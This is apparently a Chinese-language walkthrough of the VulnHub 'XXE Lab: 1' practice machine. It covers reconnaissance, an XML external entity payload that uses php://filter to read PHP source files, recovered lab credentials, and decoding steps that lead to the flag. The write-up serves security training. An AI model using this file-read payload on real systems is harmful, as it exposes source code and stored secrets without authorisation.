

# XXE Lab: 1



> 靶机文档：[XXE Lab: 1](https://www.vulnhub.com/entry/xxe-lab-1,254/)
>
> 下载地址：[**Download (Mirror)**](https://download.vulnhub.com/xxe/XXE.zip)
>
> 难易程度：**Easy**

![image-20230918185823631](./imgs/image-20230918185823631.png)

告诉了利用点：`http://your-ip/xxe`

### 信息收集

#### 主机发现

![image-20230918185923380](./imgs/image-20230918185923380.png)

#### 端口扫描

![image-20230918190240615](./imgs/image-20230918190240615.png)

#### 目录扫描

![image-20230918190421593](./imgs/image-20230918190421593.png)

访问`robots.txt`

![image-20230918190510584](./imgs/image-20230918190510584.png)

访问`/xxe`

![image-20230918190622626](./imgs/image-20230918190622626.png)

登陆抓包

![image-20230918190827135](./imgs/image-20230918190827135.png)

看到的登陆的格式就是`XML`语言的数据格式

### 漏洞利用

payload:

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">
]>
<root><name>&admin;</name><password>hj</password></root>
```



![image-20230918192600413](./imgs/image-20230918192600413.png)

将选中`base64`格式的数据，发送到`Decoder`模块，去解码

![image-20230918192806522](./imgs/image-20230918192806522.png)

刚才`robots.txt`文件里还显示有一个`admin.php`，尝试读取一下

![image-20230918192848095](./imgs/image-20230918192848095.png)

解码发现了用户名和密码

用户名：`administhebest`

密码解密后是`admin@123`

![image-20230918192932509](./imgs/image-20230918192932509.png)

还发现了`/flagmoout.php`

![image-20230918192956028](./imgs/image-20230918192956028.png)

先用得到的账密进行登陆

![image-20230918193541551](./imgs/image-20230918193541551.png)

![image-20230918193600781](./imgs/image-20230918193600781.png)

也跳转到了`/flagmeout.php`

![image-20230918193623009](./imgs/image-20230918193623009.png)

![image-20230918193646153](./imgs/image-20230918193646153.png)

`base64`解码后得到一串`base32格式`的数据

```
JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5
```

> 解码地址：https://www.qqxiuzi.cn/bianma/base.php

![image-20230918193757664](./imgs/image-20230918193757664.png)

解码后得到`base64`格式的

再进行`base64`解码，得到一个路径，再次外部实体注入

![image-20230918193848566](./imgs/image-20230918193848566.png)

![image-20230918194122306](./imgs/image-20230918194122306.png)

![image-20230918194108391](./imgs/image-20230918194108391.png)

![image-20230918195137615](./imgs/image-20230918195137615.png)

运行需要php版本较低 ，高版本会报错，导致出不来结果

[php5.6在线运行](https://code.y444.cn/php)